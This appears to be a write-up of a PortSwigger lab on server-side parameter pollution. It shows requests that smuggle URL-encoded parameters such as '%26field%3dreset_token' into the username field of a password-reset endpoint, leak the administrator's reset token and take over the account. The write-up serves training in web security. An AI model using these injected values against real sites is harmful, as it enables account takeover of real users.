# [Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)

## exploring app

- open the lab in burp browser
- try to log in as **administrator**
- then reset password
- in **Target** check the `GET` request for `/static/js/forgotPassword.js`
- its response is the `forgotPassword.js` that has a line:

```js
HTTP/2 200 OK
...
forgotPwdReady(() => {
    ...
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    ...
});
```

- the important part is the `/forgot-password?reset_token=${resetToken}`
- if there is a `resetToken` is available for the **administrator** then giving a new password can hijack the admin

## retrieving reset token

- in **proxy** send the `POST /forgot-password` to the repeater

```
POST /forgot-password HTTP/2
...
csrf=something&username=administrator
```

- test it again if the `csrf` still valid (it is)
- try to send it with a different username

```
POST /forgot-password HTTP/2
...
csrf=something&username=administratorx
```

- it will return a `400`

```
HTTP/2 400 Bad Request
...
{"type":"ClientError","code":400,"error":"Invalid username."}
```

- so the response reliable
- try to add `&x=y` (but url encoded) after the **administrator**

```
POST /forgot-password HTTP/2
...
csrf=something=administrator%26x%3dy
```

- it will return a `400`

```
HTTP/2 400 Bad Request
...
{"error": "Parameter is not supported."}
```

- so there might be some parameters that could work
- try to truncate it with `#` (url encoded or not)

```
POST /forgot-password HTTP/2
...
csrf=something&username=administrator%23
```

- it will return a `400` again:

```
HTTP/2 400 Bad Request
...
{"error": "Field not specified."}
```

- maybe a `field` parameter was removed with the `#` on the server
- lets try to add `&field=qwe` (url encoded) to the administrator

```
POST /forgot-password HTTP/2
...
csrf=something&username=administrator%26field%3dqwe
```

- it will return

```
HTTP/2 400 Bad Request
...
{"type":"ClientError","code":400,"error":"Invalid field."}
```

- what could mean that the `field` parameter is good just with different value
- lets try the `reset_token` -> `&field=reset_token` (url encoded)

```
POST /forgot-password HTTP/2
...
csrf=something&username=administrator%26field%3dreset_token
```

- it will return a reset token response

```
HTTP/2 200 OK
...
{"result":"reset-token-value","type":"reset_token"}
```

- go back to the `/forgot-password` url in the browser and add `/forgot-password?reset_token=reset-token-value` to it
- it should offer a new password option for the **administrator**
- create a new one
- log in
- delete carlos
